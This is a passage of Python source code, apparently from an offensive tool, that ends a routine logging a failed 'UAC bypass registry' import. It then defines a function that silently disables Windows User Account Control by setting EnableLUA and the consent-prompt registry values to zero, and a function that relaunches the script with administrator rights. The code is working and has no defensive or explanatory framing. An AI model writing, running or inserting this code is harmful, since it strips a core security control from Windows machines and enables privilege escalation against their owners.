        log_message(f"Failed to import UAC bypass registry: {e}")
        return False

def disable_uac():
    """Disable UAC completely through registry modifications."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Disable UAC via registry
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorUser", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            log_message("UAC disabled successfully")
            return True
            
        except Exception as e:
            log_message(f"Failed to disable UAC: {e}")
            return False
            
    except ImportError:
        return False

def run_as_admin():
    """Attempt to restart script with administrator privileges."""
    if is_admin():
        return True
    
    try:
        import ctypes
        import sys
        script = os.path.abspath(__file__)
        params = ' '.join(sys.argv[1:])
        
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1
        )
        return True
        
    except Exception as e:
        log_message(f"Failed to run as admin: {e}")
        return False
